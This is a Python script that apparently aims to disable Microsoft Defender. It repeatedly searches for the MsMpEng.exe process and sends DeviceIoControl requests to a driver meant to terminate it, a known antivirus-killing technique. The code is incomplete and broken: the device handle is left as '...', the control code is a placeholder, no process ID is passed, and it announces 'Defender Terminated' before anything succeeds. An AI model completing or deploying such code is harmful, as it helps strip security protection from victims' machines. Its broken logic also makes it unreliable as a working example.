import psutil
import ctypes
import ctypes.wintypes
import time
import sys

# Constants for DeviceIoControl
TERMINSTE_PROCESS_IOCTL_CODE = 0x0000  # Example IOCTL code; replace with actual if needed

# Load the necessary DLL
kernel32 = ctypes.windll.kernel32

# Define the DeviceIoControl function prototype
def DeviceIoControl(
    hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
    lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped
):
    return kernel32.DeviceIoControl(
        hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
        lpOutBuffer, nOutBufferSize, ctypes.byref(lpBytesReturned),
        lpOverlapped
    )

def terminate_msmpeng():
    # Prepare variables for DeviceIoControl call
    hDevice = ...  # Initialize handle to the appropriate device
    lpInBuffer = None
    nInBufferSize = 0
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = ctypes.c_ulong(0)
    lpOverlapped = ctypes.c_void_p(0)

    process_found = False

    while True:
        # Check for MsMpEng.exe process
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'MsMpEng.exe':
                if not process_found:
                    print("Defender Terminated ..")

                process_found = True
                
                # Call DeviceIoControl
                success = DeviceIoControl(
                    hDevice, TERMINSTE_PROCESS_IOCTL_CODE, lpInBuffer, nInBufferSize,
                    lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped
                )

                if not success:
                    print("Error: DeviceIoControl failed")
                    break

        if not process_found:
            time.sleep(0.7)
            continue

        break

    # Make one final call to DeviceIoControl after the loop
    final_success = DeviceIoControl(
        hDevice, TERMINSTE_PROCESS_IOCTL_CODE, lpInBuffer, nInBufferSize,
        lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped
    )

    if not final_success:
        print("Final DeviceIoControl call failed")
        return False

    return True

# Call the function
terminate_msmpeng()